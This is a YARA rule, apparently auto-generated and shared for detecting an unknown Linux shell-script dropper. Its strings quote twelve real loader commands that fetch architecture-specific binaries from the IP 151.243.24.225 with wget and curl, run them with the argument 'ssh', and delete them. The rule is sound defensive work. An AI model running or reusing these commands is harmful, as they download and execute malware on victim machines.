rule SCRIPT_Dropper_Unknown_ForgeAuto_25f4118a
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "25f4118ae989c009c26943b29ad08553509947a72ee2e4374b5f26a2ba0b0399"
        yarahub_uuid = "37f729aa-9710-4f26-b73a-2e7120226a56"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "29a4b6a65b316d780b7684391e1b87c1"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "/bin/bash" ascii
        $s1 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0uparm; curl -O http://151.243.24.225/0uparm; chmod +x 0uparm; ./0uparm ssh; rm -rf 0uparm; rm -rf 0uparm.1" ascii
        $s2 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0uparm5; curl -O http://151.243.24.225/0uparm5; chmod +x 0uparm5; ./0uparm5 ssh; rm -rf 0uparm5; rm -rf 0uparm5.1" ascii
        $s3 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0uparm6; curl -O http://151.243.24.225/0uparm6; chmod +x 0uparm6; ./0uparm6 ssh; rm -rf 0uparm6; rm -rf 0uparm6.1" ascii
        $s4 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0uparm7; curl -O http://151.243.24.225/0uparm7; chmod +x 0uparm7; ./0uparm7 ssh; rm -rf 0uparm7; rm -rf 0uparm7.1" ascii
        $s5 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0upm68k; curl -O http://151.243.24.225/0upm68k; chmod +x 0upm68k; ./0upm68k ssh; rm -rf 0upm68k; rm -rf 0upm68k.1" ascii
        $s6 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0upmips; curl -O http://151.243.24.225/0upmips; chmod +x 0upmips; ./0upmips ssh; rm -rf 0upmips; rm -rf 0upmips.1" ascii
        $s7 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0upmpsl; curl -O http://151.243.24.225/0upmpsl; chmod +x 0upmpsl; ./0upmpsl ssh; rm -rf 0upmpsl; rm -rf 0upmpsl.1" ascii
        $s8 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0upppc; curl -O http://151.243.24.225/0upppc; chmod +x 0upppc; ./0upppc ssh; rm -rf 0upppc; rm -rf 0upppc.1" ascii
        $s9 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0upsh4; curl -O http://151.243.24.225/0upsh4; chmod +x 0upsh4; ./0upsh4 ssh; rm -rf 0upsh4; rm -rf 0upsh4.1" ascii
        $s10 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0upspc; curl -O http://151.243.24.225/0upspc; chmod +x 0upspc; ./0upspc ssh; rm -rf 0upspc; rm -rf 0upspc.1" ascii
        $s11 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0upx64; curl -O http://151.243.24.225/0upx64; chmod +x 0upx64; ./0upx64 ssh; rm -rf 0upx64; rm -rf 0upx64.1" ascii
        $s12 = "cd /var/tmp || cd /tmp; wget 151.243.24.225/0upx86; curl -O http://151.243.24.225/0upx86; chmod +x 0upx86; ./0upx86 ssh; rm -rf 0upx86; rm -rf 0upx86.1" ascii
    condition:
        true and filesize < 50MB and 2 of them and 1 of ($s0, $s1, $s2, $s3, $s4)
}
